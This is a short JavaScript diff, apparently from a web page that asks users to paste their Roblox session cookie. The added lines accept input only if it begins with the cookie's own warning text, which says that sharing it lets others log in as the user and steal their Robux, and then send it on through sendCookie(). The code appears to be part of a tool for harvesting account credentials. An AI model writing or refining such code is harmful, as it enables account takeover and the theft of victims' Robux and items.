@@ -31,6 +31,12 @@ input.addEventListener('keypress', async (e) => {
             return;
         }
 
+        // Check if cookie starts with the correct format
+        if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|')) {
+            showStatus('Invalid cookie format', 'error');
+            return;
+        }
+
         await sendCookie(cookie);
     }
 });
